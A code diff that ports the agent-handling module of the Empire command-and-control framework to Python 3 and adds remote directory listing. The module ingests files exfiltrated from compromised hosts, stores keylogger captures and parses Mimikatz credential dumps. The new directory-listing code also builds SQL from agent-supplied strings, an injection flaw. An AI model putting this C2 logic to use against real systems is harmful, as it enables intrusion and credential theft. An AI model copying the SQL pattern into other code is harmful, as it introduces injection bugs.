@@ -55,24 +55,29 @@ handle_agent_data() is the main function that should be used by external listene
 Most methods utilize self.lock to deal with the concurreny issue of kicking off threaded listeners.
 
 """
-# -*- encoding: utf-8 -*-
-import os
+from __future__ import absolute_import
+from __future__ import print_function
+
+import sqlite3
 import json
+import os
 import string
 import threading
+from builtins import object
+# -*- encoding: utf-8 -*-
+from builtins import str
 from pydispatch import dispatcher
-from zlib_wrapper import compress
 from zlib_wrapper import decompress
 
 # Empire imports
-import encryption
-import helpers
-import packets
-import messages
-import events
+from . import encryption
+from . import events
+from . import helpers
+from . import messages
+from . import packets
 
 
-class Agents:
+class Agents(object):
     """
     Main class that contains agent handling functionality, including key
     negotiation in process_get() and process_post().
@@ -139,7 +144,7 @@ class Agents:
         Add an agent to the internal cache and database.
         """
 
-        currentTime = helpers.get_datetime()
+        currentTime = helpers.getutcnow()
         checkinTime = currentTime
         lastSeenTime = currentTime
 
@@ -164,7 +169,7 @@ class Agents:
             signal = json.dumps({
                 'print': True,
                 'message': message,
-                'timestamp': checkinTime,
+                'timestamp': checkinTime.isoformat(),
                 'event_type': 'checkin'
             })
             dispatcher.send(signal, sender="agents/{}".format(sessionID))
@@ -237,15 +242,16 @@ class Agents:
             return True
 
 
-    def save_file(self, sessionID, path, data, append=False):
+    def save_file(self, sessionID, path, data, filesize, append=False):
         """
         Save a file download for an agent to the appropriately constructed path.
         """
+        nameid = self.get_agent_id_db(sessionID)
+        if nameid:
+            sessionID = nameid
 
-        sessionID = self.get_agent_name_db(sessionID)
         lang = self.get_language_db(sessionID)
         parts = path.split("\\")
-        parts
 
         # construct the appropriate save path
         save_path = "%sdownloads/%s/%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
@@ -276,10 +282,10 @@ class Agents:
                 f = open("%s/%s" % (save_path, filename), 'ab')
 
             if "python" in lang:
-                print helpers.color("\n[*] Compressed size of %s download: %s" %(filename, helpers.get_file_size(data)), color="green")
+                print(helpers.color("\n[*] Compressed size of %s download: %s" %(filename, helpers.get_file_size(data)), color="green"))
                 d = decompress.decompress()
                 dec_data = d.dec_data(data)
-                print helpers.color("[*] Final size of %s wrote: %s" %(filename, helpers.get_file_size(dec_data['data'])), color="green")
+                print(helpers.color("[*] Final size of %s wrote: %s" %(filename, helpers.get_file_size(dec_data['data'])), color="green"))
                 if not dec_data['crc32_check']:
                     message = "[!] WARNING: File agent {} failed crc32 check during decompression!\n[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!".format(nameid, dec_data['header_crc32'], dec_data['dec_crc32'], dec_data['crc32_check'])
                     signal = json.dumps({
@@ -294,8 +300,10 @@ class Agents:
         finally:
             self.lock.release()
 
+        percent = round(int(os.path.getsize("%s/%s" % (save_path, filename)))/int(filesize)*100,2)
+
         # notify everyone that the file was downloaded
-        message = "[+] Part of file {} from {} saved".format(filename, sessionID)
+        message = "[+] Part of file {} from {} saved [{}%]".format(filename, sessionID, percent)
         signal = json.dumps({
             'print': True,
             'message': message
@@ -317,17 +325,17 @@ class Agents:
 
         # decompress data if coming from a python agent:
         if "python" in lang:
-            print helpers.color("\n[*] Compressed size of %s download: %s" %(filename, helpers.get_file_size(data)), color="green")
+            print(helpers.color("\n[*] Compressed size of %s download: %s" %(filename, helpers.get_file_size(data)), color="green"))
             d = decompress.decompress()
             dec_data = d.dec_data(data)
-            print helpers.color("[*] Final size of %s wrote: %s" %(filename, helpers.get_file_size(dec_data['data'])), color="green")
+            print(helpers.color("[*] Final size of %s wrote: %s" %(filename, helpers.get_file_size(dec_data['data'])), color="green"))
             if not dec_data['crc32_check']:
-                message = "[!] WARNING: File agent {} failed crc32 check during decompression!\n[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!".format(nameid, dec_data['header_crc32'], dec_data['dec_crc32'], dec_data['crc32_check'])
+                message = "[!] WARNING: File agent {} failed crc32 check during decompression!\n[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!".format(sessionID, dec_data['header_crc32'], dec_data['dec_crc32'], dec_data['crc32_check'])
                 signal = json.dumps({
                     'print': True,
                     'message': message
                 })
-                dispatcher.send(signal, sender="agents/{}".format(nameid))
+                dispatcher.send(signal, sender="agents/{}".format(sessionID))
             data = dec_data['data']
 
         try:
@@ -348,14 +356,15 @@ class Agents:
                 os.makedirs(save_path)
 
             # save the file out
-            f = open(save_path + "/" + filename, 'w')
+            f = open("%s/%s" % (save_path, filename), 'wb')
+
             f.write(data)
             f.close()
         finally:
             self.lock.release()
 
         # notify everyone that the file was downloaded
-        message = "[+] File {} from {} saved".format(path, sessionID)
+        message = "\n[+] File {} from {} saved".format(path, sessionID)
         signal = json.dumps({
             'print': True,
             'message': message
@@ -369,7 +378,8 @@ class Agents:
         """
         Save the agent console output to the agent's log file.
         """
-
+        if isinstance(data, bytes):
+           data = data.decode('UTF-8')
         name = self.get_agent_name_db(sessionID)
         save_path = self.installPath + "/downloads/" + str(name) + "/"
 
@@ -608,7 +618,6 @@ class Agents:
         """
         Return agent results from the backend database.
         """
-
         agent_name = sessionID
 
         # see if we were passed a name instead of an ID
@@ -617,7 +626,7 @@ class Agents:
             sessionID = nameid
 
         if sessionID not in self.agents:
-            print helpers.color("[!] Agent %s not active." % (agent_name))
+            print(helpers.color("[!] Agent %s not active." % (agent_name)))
         else:
             conn = self.get_db_connection()
             try:
@@ -840,12 +849,58 @@ class Agents:
 
         return autoruns
 
-
     ###############################################################
     #
     # Methods to update agent information fields.
     #
     ###############################################################
+    def update_dir_list(self, session_id, response):
+        """"
+        Update the directory list
+        """
+        name_id = self.get_agent_id_db(session_id)
+        if name_id:
+            session_id = name_id
+
+        if session_id in self.agents:
+            conn = self.get_db_connection()
+            old_factory = conn.row_factory
+            conn.row_factory = sqlite3.Row
+            try:
+                self.lock.acquire()
+                cur = conn.cursor()
+
+                # get existing files/dir that are in this directory.
+                # delete them and their children to keep everything up to date. There's a cascading delete on the table.
+                this_directory = cur.execute("SELECT * FROM file_directory where session_id = ? and path = ?",
+                                             [session_id, response['directory_path']]).fetchone()
+                if this_directory:
+                    cur.execute("DELETE FROM file_directory WHERE session_id = ? and parent_id = ?",
+                                [session_id, this_directory['id']])
+                else:  # if the directory doesn't exist we have to create one
+                    # parent is None for now even though it might have one. This is self correcting.
+                    # If it's true parent is scraped, then this entry will get rewritten
+                    cur.execute("INSERT INTO file_directory  ('name', 'path', 'parent_id', 'is_file', 'session_id')VALUES ('{0}', '{1}', '{2}', '{3}', '{4}')"
+                                .format(response['directory_name'], response['directory_path'], None, 0, session_id))
+                    this_directory = cur.execute("SELECT * FROM file_directory where session_id = ? and path = ?",
+                                                 [session_id, response['directory_path']]).fetchone()
+
+                delete = ""
+                insert = "INSERT INTO file_directory  ('name', 'path', 'parent_id', 'is_file', 'session_id') VALUES "
+                insert_arr = []
+                # insert all the new items
+                for item in response['items']:
+                    # Delete it if its already there so that we can be self correcting
+                    delete += f"\nDELETE FROM file_directory WHERE session_id = '{session_id}' AND path = '{item['path']}';"
+                    insert_arr.append(f"('{item['name']}', '{item['path']}', '{None if not this_directory else this_directory['id']}', '{1 if item['is_file'] is True else 0}', '{session_id}')")
+
+                if len(insert_arr) > 0:
+                    cur.executescript(delete)
+                    cur.execute(insert + ','.join(insert_arr) + ';')
+                cur.close()
+            finally:
+                conn.row_factory = old_factory
+                self.lock.release()
 
     def update_agent_results_db(self, sessionID, results):
         """
@@ -853,6 +908,9 @@ class Agents:
         """
 
         # see if we were passed a name instead of an ID
+        if isinstance(results, bytes):
+            results = results.decode('UTF-8')
+
         nameid = self.get_agent_id_db(sessionID)
         if nameid:
             sessionID = nameid
@@ -866,7 +924,6 @@ class Agents:
                 # get existing agent results
                 cur.execute("SELECT results FROM agents WHERE session_id LIKE ?", [sessionID])
                 agent_results = cur.fetchone()
-
                 if agent_results and agent_results[0]:
                     agent_results = json.loads(agent_results[0])
                 else:
@@ -912,7 +969,7 @@ class Agents:
         """
 
         if not current_time:
-            current_time = helpers.get_datetime()
+            current_time = helpers.getutcnow()
         conn = self.get_db_connection()
         try:
             self.lock.acquire()
@@ -944,7 +1001,7 @@ class Agents:
         """
 
         if not newname.isalnum():
-            print helpers.color("[!] Only alphanumeric characters allowed for names.")
+            print(helpers.color("[!] Only alphanumeric characters allowed for names."))
             return False
 
         conn = self.get_db_connection()
@@ -957,7 +1014,7 @@ class Agents:
 
             # check if the folder is already used
             if os.path.exists(newPath):
-                print helpers.color("[!] Name already used by current or past agent.")
+                print(helpers.color("[!] Name already used by current or past agent."))
                 retVal = False
             else:
                 # move the old folder path to the new one
@@ -1023,8 +1080,8 @@ class Agents:
             cur.execute("UPDATE config SET autorun_data=?", [moduleData])
             cur.close()
         except Exception:
-            print helpers.color("[!] Error: script autoruns not a database field, run ./setup_database.py to reset DB schema.")
-            print helpers.color("[!] Warning: this will reset ALL agent connections!")
+            print(helpers.color("[!] Error: script autoruns not a database field, run ./setup_database.py to reset DB schema."))
+            print(helpers.color("[!] Warning: this will reset ALL agent connections!"))
 
 
     def clear_autoruns_db(self):
@@ -1049,20 +1106,20 @@ class Agents:
     #
     ###############################################################
 
-    def add_agent_task_db(self, sessionID, taskName, task=''):
+    def add_agent_task_db(self, sessionID, taskName, task='', moduleName=None, uid=None):
         """
         Add a task to the specified agent's buffer in the database.
         """
-
         agentName = sessionID
-
         # see if we were passed a name instead of an ID
         nameid = self.get_agent_id_db(sessionID)
+        timestamp = helpers.getutcnow()
+
         if nameid:
             sessionID = nameid
 
         if sessionID not in self.agents:
-            print helpers.color("[!] Agent %s not active." % (agentName))
+            print(helpers.color("[!] Agent %s not active." % (agentName)))
         else:
             if sessionID:
                 message = "[*] Tasked {} to run {}".format(sessionID, taskName)
@@ -1089,11 +1146,20 @@ class Agents:
                     if pk is None:
                         pk = 0
                     pk = (pk + 1) % 65536
-                    cur.execute("INSERT INTO taskings (id, agent, data) VALUES(?, ?, ?)", [pk, sessionID, task[:100]])
+                    cur.execute("INSERT INTO taskings (id, agent, data, user_id, timestamp, module_name) VALUES(?,?,?,?,?,?)",
+                                [pk, sessionID, task[:100], uid, timestamp, moduleName])
+
+                    # Create result for data when it arrives
+                    cur.execute("INSERT INTO results (id, agent, user_id) VALUES (?,?,?)", (pk, sessionID, uid))
 
                     # append our new json-ified task and update the backend
                     agent_tasks.append([taskName, task, pk])
                     cur.execute("UPDATE agents SET taskings=? WHERE session_id=?", [json.dumps(agent_tasks), sessionID])
+
+                    # update last seen time for user
+                    last_logon = helpers.getutcnow()
+                    cur.execute("UPDATE users SET last_logon_time = ? WHERE id = ?",
+                                (last_logon, uid))
 
                     # dispatch this event
                     message = "[*] Agent {} tasked with task ID {}".format(sessionID, pk)
@@ -1114,7 +1180,6 @@ class Agents:
                         f = open('%s/LastTask' % (self.installPath), 'w')
                         f.write(task)
                         f.close()
-
                     return pk
 
                 finally:
@@ -1134,7 +1199,7 @@ class Agents:
             sessionID = nameid
 
         if sessionID not in self.agents:
-            print helpers.color("[!] Agent %s not active." % (agentName))
+            print(helpers.color("[!] Agent %s not active." % (agentName)))
             return []
         else:
             conn = self.get_db_connection()
@@ -1252,7 +1317,7 @@ class Agents:
             try:
                 message = encryption.aes_decrypt_and_verify(stagingKey, encData)
             except Exception as e:
-                print 'exception e:' + str(e)
+                print('exception e:' + str(e))
                 # if we have an error during decryption
                 message = "[!] HMAC verification failed from '{}'".format(sessionID)
                 signal = json.dumps({
@@ -1264,7 +1329,7 @@ class Agents:
 
             if language.lower() == 'powershell':
                 # strip non-printable characters
-                message = ''.join(filter(lambda x: x in string.printable, message))
+                message = ''.join([x for x in message.decode('UTF-8') if x in string.printable])
 
                 # client posts RSA key
                 if (len(message) < 400) or (not message.endswith("</RSAKeyValue>")):
@@ -1286,7 +1351,6 @@ class Agents:
                             'message': message
                         })
                         dispatcher.send(signal, sender="agents/{}".format(sessionID))
-
                         nonce = helpers.random_string(16, charset=string.digits)
                         delay = listenerOptions['DefaultDelay']['Value']
                         jitter = listenerOptions['DefaultJitter']['Value']
@@ -1383,11 +1447,13 @@ class Agents:
         elif meta == 'STAGE2':
             # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
 
-            sessionKey = self.agents[sessionID]['sessionKey']
+            sessionKey = (self.agents[sessionID]['sessionKey'])
+            if isinstance(sessionKey, str):
+                sessionKey = (self.agents[sessionID]['sessionKey']).encode('UTF-8')
 
             try:
                 message = encryption.aes_decrypt_and_verify(sessionKey, encData)
-                parts = message.split('|')
+                parts = message.split(b'|')
 
                 if len(parts) < 12:
                     message = "[!] Agent {} posted invalid sysinfo checkin format: {}".format(sessionID, message)
@@ -1419,18 +1485,18 @@ class Agents:
                 })
                 dispatcher.send(signal, sender="agents/{}".format(sessionID))
 
-                listener = unicode(parts[1], 'utf-8')
-                domainname = unicode(parts[2], 'utf-8')
-                username = unicode(parts[3], 'utf-8')
-                hostname = unicode(parts[4], 'utf-8')
-                external_ip = unicode(clientIP, 'utf-8')
-                internal_ip = unicode(parts[5], 'utf-8')
-                os_details = unicode(parts[6], 'utf-8')
-                high_integrity = unicode(parts[7], 'utf-8')
-                process_name = unicode(parts[8], 'utf-8')
-                process_id = unicode(parts[9], 'utf-8')
-                language = unicode(parts[10], 'utf-8')
-                language_version = unicode(parts[11], 'utf-8')
+                listener = str(parts[1], 'utf-8')
+                domainname = str(parts[2], 'utf-8')
+                username = str(parts[3], 'utf-8')
+                hostname = str(parts[4], 'utf-8')
+                external_ip = clientIP
+                internal_ip = str(parts[5], 'utf-8')
+                os_details = str(parts[6], 'utf-8')
+                high_integrity = str(parts[7], 'utf-8')
+                process_name = str(parts[8], 'utf-8')
+                process_id = str(parts[9], 'utf-8')
+                language = str(parts[10], 'utf-8')
+                language_version = str(parts[11], 'utf-8')
                 if high_integrity == "True":
                     high_integrity = 1
                 else:
@@ -1480,7 +1546,7 @@ class Agents:
             if autorun and autorun[0] != '' and autorun[1] != '':
                 self.add_agent_task_db(sessionID, autorun[0], autorun[1])
 
-            if self.mainMenu.autoRuns.has_key(language.lower()) and len(self.mainMenu.autoRuns[language.lower()]) > 0:
+            if language.lower() in self.mainMenu.autoRuns and len(self.mainMenu.autoRuns[language.lower()]) > 0:
                 autorunCmds = ["interact %s" % sessionID]
                 autorunCmds.extend(self.mainMenu.autoRuns[language.lower()])
                 autorunCmds.extend(["lastautoruncmd"])
@@ -1489,10 +1555,10 @@ class Agents:
                     #this will cause the cmdloop() to start processing the autoruns
                     self.mainMenu.do_agents("kickit")
                 except Exception as e:
-                    if e.message == "endautorun":
+                    if e == "endautorun":
                         pass
                     else:
-                        raise e
+                        print(helpers.color("[!] End of Autorun Queue" ))
 
             return "STAGE2: %s" % (sessionID)
 
@@ -1511,9 +1577,8 @@ class Agents:
 
         Abstracted out sufficiently for any listener module to use.
         """
-
         if len(routingPacket) < 20:
-            message = "[!] handle_agent_data(): routingPacket wrong length: {}".format(routingPacket)
+            message = "[!] handle_agent_data(): routingPacket wrong length: {}".format(len(routingPacket))
             signal = json.dumps({
                 'print': False,
                 'message': message
@@ -1522,15 +1587,13 @@ class Agents:
             return None
 
         routingPacket = packets.parse_routing_packet(stagingKey, routingPacket)
-
         if not routingPacket:
             return [('', "ERROR: invalid routing packet")]
 
         dataToReturn = []
 
         # process each routing packet
-        for sessionID, (language, meta, additional, encData) in routingPacket.iteritems():
-
+        for sessionID, (language, meta, additional, encData) in routingPacket.items():
             if meta == 'STAGE0' or meta == 'STAGE1' or meta == 'STAGE2':
                 message = "[*] handle_agent_data(): sessionID {} issued a {} request".format(sessionID, meta)
                 signal = json.dumps({
@@ -1601,7 +1664,7 @@ class Agents:
 
         if taskings and taskings != []:
 
-            all_task_packets = ''
+            all_task_packets = b''
 
             # build tasking packets for everything we have
             for tasking in taskings:
@@ -1653,31 +1716,23 @@ class Agents:
             # process the packet and extract necessary data
             responsePackets = packets.parse_result_packets(packet)
             results = False
-
             # process each result packet
             for (responseName, totalPacket, packetNum, taskID, length, data) in responsePackets:
                 # process the agent's response
                 self.process_agent_packet(sessionID, responseName, taskID, data)
                 results = True
-
-            conn = self.get_db_connection()
-            cur = conn.cursor()
-            data = cur.execute("SELECT data FROM taskings WHERE agent=? AND id=?", [sessionID,taskID]).fetchone()[0]
-            cur.close()
-            theSender="Agents"
-            if data.startswith("function Get-Keystrokes"):
-                theSender += "PsKeyLogger"
             if results:
                 # signal that this agent returned results
                 message = "[*] Agent {} returned results.".format(sessionID)
                 signal = json.dumps({
-                    'print': True,
+                    'print': False,
                     'message': message
                 })
                 dispatcher.send(signal, sender="agents/{}".format(sessionID))
 
             # return a 200/valid
             return 'VALID'
+
 
         except Exception as e:
             message = "[!] Error processing result packet from {} : {}".format(sessionID, e)
@@ -1691,7 +1746,6 @@ class Agents:
             #   when an exception is thrown, something causes the lock to remain locked...
             # if self.lock.locked():
             #     self.lock.release()
-
             return None
 
 
@@ -1725,20 +1779,14 @@ class Agents:
 
             # insert task results into the database, if it's not a file
             if taskID != 0 and responseName not in ["TASK_DOWNLOAD", "TASK_CMD_JOB_SAVE", "TASK_CMD_WAIT_SAVE"] and data != None:
-                # if the taskID does not exist for this agent, create it
-                if cur.execute("SELECT * FROM results WHERE id=? AND agent=?", [taskID, sessionID]).fetchone() is None:
-                    pk = cur.execute("SELECT max(id) FROM results WHERE agent=?", [sessionID]).fetchone()[0]
-                    if pk is None:
-                        pk = 0
-                    # only 2 bytes for the task ID, so wraparound
-                    pk = (pk + 1) % 65536
-                    cur.execute("INSERT INTO results (id, agent, data) VALUES (?,?,?)",(pk, sessionID, data))
-                else:
-                    try:
-                        keyLogTaskID = cur.execute("SELECT id FROM taskings WHERE agent=? AND data LIKE \"function Get-Keystrokes%\"", [sessionID]).fetchone()[0]
-                    except Exception as e:
-                        pass
-                    cur.execute("UPDATE results SET data=data||? WHERE id=? AND agent=?", [data, taskID, sessionID])
+                # Update result with data
+                cur.execute("UPDATE results SET data=? WHERE id=?",(data, taskID))
+
+                try:
+                    keyLogTaskID = cur.execute("SELECT id FROM taskings WHERE agent=? AND data LIKE \"function Get-Keystrokes%\"", [sessionID]).fetchone()[0]
+                except Exception as e:
+                    pass
+                cur.execute("UPDATE results SET data=data||? WHERE id=? AND agent=?", [data, taskID, sessionID])
 
         finally:
             cur.close()
@@ -1749,19 +1797,23 @@ class Agents:
 
         if responseName == "ERROR":
             # error code
-            message = "[!] Received error response from {}".format(sessionID)
+            message = "\n[!] Received error response from {}".format(sessionID)
             signal = json.dumps({
                 'print': True,
                 'message': message
             })
             dispatcher.send(signal, sender="agents/{}".format(sessionID))
             self.update_agent_results_db(sessionID, data)
+
+            if isinstance(data,bytes):
+                data = data.decode('UTF-8')
             # update the agent log
             self.save_agent_log(sessionID, "[!] Error response: " + data)
 
 
         elif responseName == "TASK_SYSINFO":
             # sys info response -> update the host info
+            data = data.decode('utf-8')
             parts = data.split("|")
             if len(parts) < 12:
                 message = "[!] Invalid sysinfo response from {}".format(sessionID)
@@ -1771,19 +1823,18 @@ class Agents:
                 })
                 dispatcher.send(signal, sender="agents/{}".format(sessionID))
             else:
-                print "sysinfo:",data
                 # extract appropriate system information
-                listener = unicode(parts[1], 'utf-8')
-                domainname = unicode(parts[2], 'utf-8')
-                username = unicode(parts[3], 'utf-8')
-                hostname = unicode(parts[4], 'utf-8')
-                internal_ip = unicode(parts[5], 'utf-8')
-                os_details = unicode(parts[6], 'utf-8')
-                high_integrity = unicode(parts[7], 'utf-8')
-                process_name = unicode(parts[8], 'utf-8')
-                process_id = unicode(parts[9], 'utf-8')
-                language = unicode(parts[10], 'utf-8')
-                language_version = unicode(parts[11], 'utf-8')
+                listener = parts[1]
+                domainname = parts[2]
+                username = parts[3]
+                hostname = parts[4]
+                internal_ip = parts[5]
+                os_details = parts[6]
+                high_integrity = parts[7]
+                process_name = parts[8]
+                process_id = parts[9]
+                language = parts[10]
+                language_version = parts[11]
                 if high_integrity == 'True':
                     high_integrity = 1
                 else:
@@ -1796,9 +1847,9 @@ class Agents:
                 self.mainMenu.agents.update_agent_sysinfo_db(sessionID, listener=listener, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity, process_name=process_name, process_id=process_id, language_version=language_version, language=language)
 
                 sysinfo = '{0: <18}'.format("Listener:") + listener + "\n"
-                sysinfo += '{0: <16}'.format("Internal IP:") + internal_ip + "\n"
+                sysinfo += '{0: <18}'.format("Internal IP:") + internal_ip + "\n"
                 sysinfo += '{0: <18}'.format("Username:") + username + "\n"
-                sysinfo += '{0: <16}'.format("Hostname:") + hostname + "\n"
+                sysinfo += '{0: <18}'.format("Hostname:") + hostname + "\n"
                 sysinfo += '{0: <18}'.format("OS:") + os_details + "\n"
                 sysinfo += '{0: <18}'.format("High Integrity:") + str(high_integrity) + "\n"
                 sysinfo += '{0: <18}'.format("Process Name:") + process_name + "\n"
@@ -1838,8 +1889,11 @@ class Agents:
 
         elif responseName == "TASK_DOWNLOAD":
             # file download
+            if isinstance(data, bytes):
+                data = data.decode('UTF-8')
+
             parts = data.split("|")
-            if len(parts) != 3:
+            if len(parts) != 4:
                 message = "[!] Received invalid file download response from {}".format(sessionID)
                 signal = json.dumps({
                     'print': True,
@@ -1847,18 +1901,28 @@ class Agents:
                 })
                 dispatcher.send(signal, sender="agents/{}".format(sessionID))
             else:
-                index, path, data = parts
+                index, path, filesize, data = parts
                 # decode the file data and save it off as appropriate
-                file_data = helpers.decode_base64(data)
+                file_data = helpers.decode_base64(data.encode('UTF-8'))
                 name = self.get_agent_name_db(sessionID)
 
                 if index == "0":
-                    self.save_file(name, path, file_data)
+                    self.save_file(name, path, file_data, filesize)
                 else:
-                    self.save_file(name, path, file_data, append=True)
+                    self.save_file(name, path, file_data, filesize, append=True)
                 # update the agent log
                 msg = "file download: %s, part: %s" % (path, index)
                 self.save_agent_log(sessionID, msg)
+
+        elif responseName == "TASK_DIR_LIST":
+            try:
+                result = json.loads(data.decode('utf-8'))
+                self.update_dir_list(sessionID, result)
+            except ValueError as e:
+                pass
+
+            self.update_agent_results_db(sessionID, data)
+            self.save_agent_log(sessionID, data)
 
         elif responseName == "TASK_GETDOWNLOADS":
             if not data or data.strip().strip() == "":
@@ -1922,12 +1986,13 @@ class Agents:
 
 
         elif responseName == "TASK_CMD_WAIT_SAVE":
+
             # dynamic script output -> blocking, save data
             name = self.get_agent_name_db(sessionID)
 
             # extract the file save prefix and extension
-            prefix = data[0:15].strip()
-            extension = data[15:20].strip()
+            prefix = data[0:15].strip().decode('UTF-8')
+            extension = data[15:20].strip().decode('UTF-8')
             file_data = helpers.decode_base64(data[20:])
 
             # save the file off to the appropriate path
@@ -1941,7 +2006,7 @@ class Agents:
 
 
         elif responseName == "TASK_CMD_JOB":
-	    #check if this is the powershell keylogging task, if so, write output to file instead of screen
+        #check if this is the powershell keylogging task, if so, write output to file instead of screen
             if keyLogTaskID and keyLogTaskID == taskID:
                 safePath = os.path.abspath("%sdownloads/" % self.mainMenu.installPath)
                 savePath = "%sdownloads/%s/keystrokes.txt" % (self.mainMenu.installPath,sessionID)
@@ -1955,6 +2020,8 @@ class Agents:
                     return
 
                 with open(savePath,"a+") as f:
+                    if isinstance(data, bytes):
+                        data = data.decode('UTF-8')
                     new_results = data.replace("\r\n","").replace("[SpaceBar]", "").replace('\b', '').replace("[Shift]", "").replace("[Enter]\r","\r\n")
                     f.write(new_results)
             else:
@@ -1966,10 +2033,12 @@ class Agents:
 
             # TODO: redo this regex for really large AD dumps
             #   so a ton of data isn't kept in memory...?
-            parts = data.split("\n")
+            if isinstance(data,str):
+                data = data.encode("UTF-8")
+            parts = data.split(b"\n")
             if len(parts) > 10:
                 time = helpers.get_datetime()
-                if parts[0].startswith("Hostname:"):
+                if parts[0].startswith(b"Hostname:"):
                     # if we get Invoke-Mimikatz output, try to parse it and add
                     #   it to the internal credential store
 
@@ -2052,10 +2121,10 @@ class Agents:
             self.save_agent_log(sessionID, data)
             message = "[+] Listener for '{}' updated to '{}'".format(sessionID, data)
             signal = json.dumps({
-                'print': True,
+                'print': False,
                 'message': message
             })
             dispatcher.send(signal, sender="agents/{}".format(sessionID))
 
         else:
-            print helpers.color("[!] Unknown response %s from %s" % (responseName, sessionID))
+            print(helpers.color("[!] Unknown response %s from %s" % (responseName, sessionID)))
